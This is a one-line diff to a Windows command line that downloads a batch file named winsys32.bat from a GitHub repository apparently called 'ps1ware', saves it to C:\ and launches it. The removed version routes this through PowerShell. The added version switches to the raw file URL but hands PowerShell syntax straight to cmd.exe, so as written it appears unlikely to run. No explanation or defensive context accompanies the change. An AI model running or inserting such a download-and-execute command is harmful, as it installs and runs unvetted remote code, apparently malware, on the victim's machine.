@@ -1,1 +1,1 @@
-cmd.exe /c "powershell -Command \"(New-Object System.Net.WebClient).DownloadFile('https://github.com/s-b-repo/ps1ware/blob/main/winsys32.bat', 'C:\winsys32.bat'); Start-Process 'powershell' -ArgumentList 'C:\winsys32.bat'\""
+cmd.exe /c "(New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/s-b-repo/ps1ware/main/winsys32.bat', 'C:\winsys32.bat'); Start-Process 'C:\winsys32.bat'"
